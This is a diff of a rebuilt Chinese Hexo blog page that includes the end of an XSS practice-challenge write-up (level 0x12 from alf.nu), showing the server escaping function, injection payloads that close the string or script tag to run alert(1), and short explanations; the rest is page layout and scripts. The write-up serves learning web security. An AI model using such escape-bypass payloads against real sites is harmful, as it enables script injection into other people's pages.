+</span><span class="token template-punctuation string">`</span></span>
+<span class="token punctuation">&#125;</span></code></pre>
 
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }</script><div class="tag_share" style="display:block"><div class="post-meta__tag-list" style="display:inline-block"><div class="article-tag"><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="chip bg-color">网络安全</span></a></div></div><div class="post_share" style="zoom:80%;width:fit-content;display:inline-block;float:right;margin:-.15rem 0"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/share/css/share.min.css"><div id="article-share"><div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/share/js/social-share.min.js"></script></div></div></div><style>#reward{margin:40px 0;text-align:center}#reward .reward-link{font-size:1.4rem;line-height:38px}#reward .btn-floating:hover{box-shadow:0 6px 12px rgba(0,0,0,.2),0 5px 15px rgba(0,0,0,.2)}#rewardModal{width:320px;height:350px}#rewardModal .reward-title{margin:15px auto;padding-bottom:5px}#rewardModal .modal-content{padding:10px}#rewardModal .close{position:absolute;right:15px;top:15px;color:rgba(0,0,0,.5);font-size:1.3rem;line-height:20px;cursor:pointer}#rewardModal .close:hover{color:#ef5350;transform:scale(1.3);-moz-transform:scale(1.3);-webkit-transform:scale(1.3);-o-transform:scale(1.3)}#rewardModal .reward-tabs{margin:0 auto;width:210px}.reward-tabs .tabs{height:38px;margin:10px auto;padding-left:0}.reward-content ul{padding-left:0!important}.reward-tabs .tabs .tab{height:38px;line-height:38px}.reward-tabs .tab a{color:#fff;background-color:#ccc}.reward-tabs .tab a:hover{background-color:#ccc;color:#fff}.reward-tabs .wechat-tab .active{color:#fff!important;background-color:#22AB38!important}.reward-tabs .alipay-tab .active{color:#fff!important;background-color:#019FE8!important}.reward-tabs .reward-img{width:210px;height:210px}</style><div id="reward"><a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a><div id="rewardModal" class="modal"><div class="modal-content"><a class="close modal-close"><i class="fas fa-times"></i></a><h4 class="reward-title">你的赏识是我前进的动力</h4><div class="reward-content"><div class="reward-tabs"><ul class="tabs row"><li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li><li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li></ul><div id="alipay"><img src="/medias/loading.gif" data-original="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码"></div><div id="wechat"><img src="/medias/loading.gif" data-original="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码"></div></div></div></div></div></div><script>$(function(){$(".tabs").tabs()})</script></div></div><article id="prenext-posts" class="prev-next articles"><div class="row article-row"><div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up"><div class="article-badge left-badge text-color"><i class="far fa-dot-circle"></i>&nbsp;本篇</div><div class="card"><a href="/posts/6057.html"><div class="card-image"><img src="/medias/loading.gif" data-original="/medias/imgs/052602.jpg" class="responsive-img" alt="xss-demo刷题记录"> <span class="card-title">xss-demo刷题记录</span></div></a><div class="card-content article-content"><div class="summary block-with-text">xss-demo刷题记录</div><div class="publish-info"><span class="publish-date"><i class="far fa-clock fa-fw icon-date"></i>2021-07-17 </span><span class="publish-author"><i class="fas fa-bookmark fa-fw icon-category"></i> <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">网络安全</a></span></div></div><div class="card-action article-tags"><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"><span class="chip bg-color">网络安全</span></a></div></div></div><div class="article col s12 m6" data-aos="fade-up"><div class="article-badge right-badge text-color">下一篇&nbsp;<i class="fas fa-chevron-right"></i></div><div class="card"><a href="/posts/d40a.html"><div class="card-image"><img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/eszterhazyschnitte-cream-slice-dessert.jpg" class="responsive-img" alt="毛概考试题库（801道）"> <span class="card-title">毛概考试题库（801道）</span></div></a><div class="card-content article-content"><div class="summary block-with-text">毛概考试题库（801道）</div><div class="publish-info"><span class="publish-date"><i class="far fa-clock fa-fw icon-date"></i>2021-07-05 </span><span class="publish-author"><i class="fas fa-bookmark fa-fw icon-category"></i> <a href="/categories/%E5%85%B6%E4%BB%96/" class="post-category">其他</a></span></div></div><div class="card-action article-tags"><a href="/tags/%E5%85%B6%E4%BB%96/"><span class="chip bg-color">其他</span></a></div></div></div></div></article></div><script>$("#articleContent").on("copy",function(e){if("undefined"!=typeof window.getSelection){var n=window.getSelection();if(!((""+n).length<Number.parseInt("120"))){var t=document.getElementsByTagName("body")[0],o=document.createElement("div");o.style.position="absolute",o.style.left="-99999px",t.appendChild(o),o.appendChild(n.getRangeAt(0).cloneContents()),"PRE"===n.getRangeAt(0).commonAncestorContainer.nodeName&&(o.innerHTML="<pre>"+o.innerHTML+"</pre>");var i=document.location.href;o.innerHTML+='<br />来源: 未名编程<br />文章作者: 未名编程<br />文章链接: <a href="'+i+'">'+i+"</a><br />本文章著作权归作者所有，任何形式的转载都请注明出处。",n.selectAllChildren(o),window.setTimeout(function(){t.removeChild(o)},200)}}})</script><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/codeBlock/codeBlockFuction.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/codeBlock/codeLang.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/codeBlock/codeCopy.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/codeBlock/codeShrink.js"></script></div><div id="toc-aside" class="expanded col l3 hide-on-med-and-down"><div class="toc-widget"><div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div><div id="toc-content"></div></div></div></div><div id="floating-toc-btn" class="hide-on-med-and-down"><a class="btn-floating btn-large bg-color"><i class="fas fa-list-ul"></i></a></div><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/tocbot/tocbot.min.js"></script><script>$(function () {
+<h4 id="input-code-16"><a href="#input-code-16" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">"),alert("</span><span class="token number">1</span></code></pre>
+
+<h4 id="解释-16"><a href="#解释-16" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>过滤了很多的字符。并且将” 替换成  &quot; ，但是并没有什么卵用，\正好可以当做是双引号里面的内容。输入的内容在javascript:console.log里面，我们将这个闭合以后添加一个alert然后把后面的注释掉。</p>
+</blockquote>
+<h4 id="运行结果-14"><a href="#运行结果-14" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><h4 id="server-code-18"><a href="#server-code-18" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// from alf.nu</span>
+<span class="token keyword">function</span> <span class="token function">escape</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  s <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">"</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\\"'</span><span class="token punctuation">)</span>
+  <span class="token keyword">return</span> <span class="token string">'&lt;script>console.log("'</span> <span class="token operator">+</span> s <span class="token operator">+</span> <span class="token string">'");&lt;/script>'</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h4 id="input-code-17"><a href="#input-code-17" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript">\"<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span></code></pre>
+
+<h4 id="解释-17"><a href="#解释-17" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>将 “ 替换成 &quot; ，输入的内容在console.log里面，在html标签外面，所以不能进行html编码。</p>
+<p>这里可以直接闭合掉script标签，重新添加一个</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+
+<p>也可以将替换的 &quot; 的 \在前面再添加一个\转义掉。</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">\"<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span></code></pre>
+</blockquote>
+<h4 id="运行结果-15"><a href="#运行结果-15" class="headerlink" title="运行结果"></a>运行结果</h4>
+                
+            </div>
+            <hr/>
+
+            
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/posts/6057.html">
+                    <div class="card-image">
+                        
+                        <img src="/medias/imgs/052602.jpg" class="responsive-img" alt="xss-demo刷题记录">
+                        
+                        <span class="card-title">xss-demo刷题记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            xss-demo刷题记录
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/d40a.html">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="毛概考试题库（801道）">
+                        
+                        <span class="card-title">毛概考试题库（801道）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            毛概考试题库（801道）
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%85%B6%E4%BB%96/" class="post-category">
+                                    其他
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%85%B6%E4%BB%96/">
+                        <span class="chip bg-color">其他</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt" aria-hidden="true"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <button type="button" class="btn-floating btn-large bg-color" aria-label="切换文章目录">
+        <i class="fas fa-list-ul" aria-hidden="true"></i>
+    </button>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
         tocbot.init({
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4 ,h5'
+            collapseDepth: Number('2'),
+            headingSelector: 'h2, h3, h4'
         });
 
         // modify the toc link href to support Chinese.
@@ -148,7 +970,7 @@
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4 ,h5').each(function () {
+        $('#articleContent').children('h2, h3, h4').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -201,9 +1023,237 @@
             fixPostCardWidth('artDetail', 'prenext-posts');
         });
         
-    });</script></main><footer class="page-footer bg-color"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/aplayer/APlayer.min.css"><style>.aplayer .aplayer-lrc p{font-size:12px;font-weight:700;line-height:16px!important}.aplayer .aplayer-lrc p.aplayer-lrc-current{font-size:15px;color:#42b983}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><div><div class="row"><meting-js class="col l8 offset-l2 m10 offset-m1 s12" server="netease" type="playlist" id="543280930" fixed="true" autoplay theme="#42b983" loop order="random" preload="auto" volume="0.7" list-folded="true"></meting-js></div></div><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/aplayer/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script><div class="container row center-align" style="margin-bottom:15px!important"><div class="col s12 m8 l8 copy-right">Copyright&nbsp;&copy; <span id="year">2020</span> <a href="https://wmlunar.github.io" target="_blank">未名编程</a> |&nbsp;Powered by&nbsp;<a href="https://wmlunar.github.io/" target="_blank">未名</a><br>&nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span class="white-color">154.1k</span>&nbsp;字 <span id="busuanzi_container_site_pv">|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv" class="white-color"></span>&nbsp;次 </span><span id="busuanzi_container_site_uv">|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv" class="white-color"></span>&nbsp;人</span><br><span id="sitetime">载入运行时间...</span><script>function siteTime(){var e=1e3,t=60*e,n=60*t,o=24*n,r=365*o,a=new Date,i="2020",l="4",m="10",M="0",g="0",d="0",s=a.getFullYear(),u=a.getMonth()+1,T=a.getDate(),c=a.getHours(),f=a.getMinutes(),h=a.getSeconds(),y=Date.UTC(i,l,m,M,g,d),H=Date.UTC(s,u,T,c,f,h),I=H-y,B=Math.floor(I/r),D=Math.floor(I/o-365*B),E=Math.floor((I-(365*B+D)*o)/n),L=Math.floor((I-(365*B+D)*o-E*n)/t),v=Math.floor((I-(365*B+D)*o-E*n-L*t)/e);i==s?(document.getElementById("year").innerHTML=s,document.getElementById("sitetime").innerHTML="本站已安全运行 "+D+" 天 "+E+" 小时 "+L+" 分钟 "+v+" 秒"):(document.getElementById("year").innerHTML=i+" - "+s,document.getElementById("sitetime").innerHTML="本站已安全运行 "+B+" 年 "+D+" 天 "+E+" 小时 "+L+" 分钟 "+v+" 秒")}setInterval(siteTime,1e3)</script><br><span id="icp"><img src="/medias/loading.gif" data-original="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/medias/icp.png" style="vertical-align:text-bottom"> <a href="http://www.beian.gov.cn/portal/registerSystemInfo?spm=5176.12825654.7y9jhqsfz.114.63662c4aBdeoTX" target="_blank">冀ICP备2020022282号</a></span></div><div class="col s12 m4 l4 social-link social-statis"><a href="https://github.com/wmlunar" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50"><i class="fab fa-github"></i> </a><a href="mailto:zh.ydhrq@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50"><i class="fas fa-envelope-open"></i> </a><a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=401246928" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 401246928" data-position="top" data-delay="50"><i class="fab fa-qq"></i> </a><a href="https://www.jianshu.com/u/1518a121cbcf" class="tooltipped" target="_blank" data-tooltip="关注我的简书: https://www.jianshu.com/u/1518a121cbcf" data-position="top" data-delay="50"><i class="fab fa-jianshu">简</i> </a><a href="https://blog.csdn.net/qq_44275213" class="tooltipped" target="_blank" data-tooltip="关注我的CSDN: https://blog.csdn.net/qq_44275213" data-position="top" data-delay="50"><i class="fab fa-csdn">C</i> </a><a href="https://leetcode-cn.com/u/weimingcoder/" class="tooltipped" target="_blank" data-tooltip="我的力扣: https://leetcode-cn.com/u/weimingcoder/" data-position="top" data-delay="50"><i class="fab fa-leetcode">力</i> </a><a href="https://blog.nowcoder.net/weiming" class="tooltipped" target="_blank" data-tooltip="我的牛客: https://blog.nowcoder.net/weiming" data-position="top" data-delay="50"><i class="fab fa-niuke">牛</i> </a><a href="https://www.cnblogs.com/weimingbiancheng/" class="tooltipped" target="_blank" data-tooltip="关注我的博客园: https://www.cnblogs.com/weimingbiancheng/" data-position="top" data-delay="50"><i class="fab fa-juejin">博</i> </a><a href="https://cdn.jsdelivr.net/gh/wmlunar/cdn_jsDelivr/imgs/wmcoder.jpg" class="tooltipped" target="_blank" data-tooltip="微信公众号: https://cdn.jsdelivr.net/gh/wmlunar/cdn_jsDelivr/imgs/wmcoder.jpg" data-position="top" data-delay="50"><i class="fab fa-weixin"></i></a></div></div></footer><div class="progress-bar"></div><div id="searchModal" class="modal"><div class="modal-content"><div class="search-header"><span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span> <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字" class="search-input"></div><div id="searchResult"></div></div></div><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/js/search.js"></script><script type="text/javascript">$(function(){searchFunc("https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/search.xml","searchInput","searchResult")})</script><div id="backTop" class="top-scroll"><a class="btn-floating btn-large waves-effect waves-light" href="#!"><i class="fas fa-arrow-up"></i></a></div><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/materialize/materialize.min.js"></script><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/masonry/masonry.pkgd.min.js"></script><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/aos/aos.js"></script><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/scrollprogress/scrollProgress.min.js"></script><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/lightGallery/js/lightgallery-all.min.js"></script><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/js/matery.js"></script><script>!function(){var t=document.createElement("script"),s=window.location.protocol.split(":")[0];"https"===s?t.src="https://zz.bdstatic.com/linksubmit/push.js":t.src="http://push.zhanzhang.baidu.com/push.js";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()</script><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/others/clicklove.js" async></script><script async src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/others/busuanzi.pure.mini.js"></script><script type="text/javascript" size="150" alpha="0.6" zindex="-1" src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/background/ribbon-refresh.min.js" async></script><script src="https://cdn.jsdelivr.net/gh/wmlunar/wmlunar.github.io/libs/instantpage/instantpage.js" type="module"></script><script>
-            window.imageLazyLoadSetting = {
-                isSPA: false,
-                processImages: null,
-            };
-        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var i=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){i&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(n.innerHeight+240||document.documentElement.clientHeight+240)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html><!-- rebuild by neat -->
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+            
+                <span id="year">2020-2026</span>
+            
+            <a href="/about">未名</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener noreferrer">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            <br>
+            
+            <br>
+            
+            <span id="icp"><img src="/medias/icp.png" alt="" aria-hidden="true" style="vertical-align: text-bottom;" />
+                <a href="http://www.beian.gov.cn/portal/registerSystemInfo?spm=5176.12825654.7y9jhqsfz.114.63662c4aBdeoTX" target="_blank" rel="noopener noreferrer">冀ICP备2020022282号</a>
+            </span>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/wmlunar" class="tooltipped" target="_blank" rel="noopener noreferrer" aria-label="访问我的 GitHub" data-tooltip="访问我的 GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github" aria-hidden="true"></i>
+    </a>
+
+
+
+    <a href="mailto:zh.ydhrq@foxmail.com" class="tooltipped" aria-label="发送邮件" data-tooltip="发送邮件" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open" aria-hidden="true"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=401246928" class="tooltipped" aria-label="通过 QQ 联系" data-tooltip="QQ 联系" data-position="top" data-delay="50">
+        <i class="fab fa-qq" aria-hidden="true"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" aria-label="RSS 订阅" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss" aria-hidden="true"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal" role="dialog" aria-modal="true" aria-labelledby="searchTitle">
+    <div class="modal-content">
+        <div class="search-header">
+            <span id="searchTitle" class="title" role="heading" aria-level="2"><i class="fas fa-search" aria-hidden="true"></i>&nbsp;&nbsp;搜索</span>
+            <label class="sr-only" for="searchInput">请输入搜索的关键字</label>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult" aria-live="polite"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        var escapeHtml = function (value) {
+            return value.replace(/[&<>"']/g, function (character) {
+                return {
+                    '&': '&amp;',
+                    '<': '&lt;',
+                    '>': '&gt;',
+                    '"': '&quot;',
+                    "'": '&#039;'
+                }[character];
+            });
+        };
+        var escapeRegExp = function (value) {
+            return value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        };
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + escapeHtml(data.title.trim()) + "</a>";
+                            var content = escapeHtml(data.content.trim().replace(/<[^>]+>/g, ""));
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(escapeRegExp(keyword), "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">$&</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!" aria-label="回到顶部">
+        <i class="fas fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
